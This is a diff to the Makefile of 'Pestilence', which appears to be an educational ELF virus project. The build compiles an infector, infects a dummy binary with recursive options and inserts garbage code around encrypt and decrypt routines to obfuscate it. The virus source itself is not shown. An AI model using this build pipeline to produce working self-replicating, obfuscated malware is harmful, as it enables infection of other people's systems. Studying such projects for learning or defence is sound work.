@@ -1,5 +1,7 @@
 NAME=Pestilence
 
+PARAMS=--recur
+
 DEBUG=0
 DEBUG_EXT=0
 FLAGS_IGNORE_WARNINGS=-Wno-unused-value -Wno-unused-variable -Wno-unused-parameter
@@ -57,7 +59,7 @@ $(NAME): $(VIRUS_X) $(OBJ_INF)
 	gcc -o $(NAME) $(OBJ_INF) $(VIRUS_X)
 	echo "int main(){return 0;}" > $(to_infect).c
 	gcc $(to_infect).c -o $(to_infect)
-	./$(NAME) --no-infect-dir --recur $(ARGS) $(to_infect)
+	./$(NAME) --no-infect-dir $(PARAMS) $(ARGS) $(to_infect)
 	mv $(NAME) .tmp/$(NAME)_infector
 	mv $(to_infect) $(NAME)
 
@@ -92,7 +94,8 @@ fn_list: $(VIRUS)
 	nm --defined-only -n .tmp/virus.template | grep -v '\.' | cut -d ' ' -f 3 | grep -v DECRYPT_ROUTINE | grep -v ENCRYPT_ROUTINE | grep -v generate_garb | sort > fn_list
 
 $(OBJ_DIR)/%.s: $(OBJ_DIR)/%.gs
-	./others/scripts/add_garbage $< -p 200 -l toto $(shell cat fn_list) || cp $< $@
+	cp $< $<.tmp
+	./others/scripts/add_garbage $< -p 10 -l toto $(shell cat fn_list) || cp $< $@
 
 $(TABLE_C): $(OBJ_NO_TABLE)
 	nm $(OBJ_NO_TABLE) | grep .garb_start | wc -l > $(GARBAGE_CF)
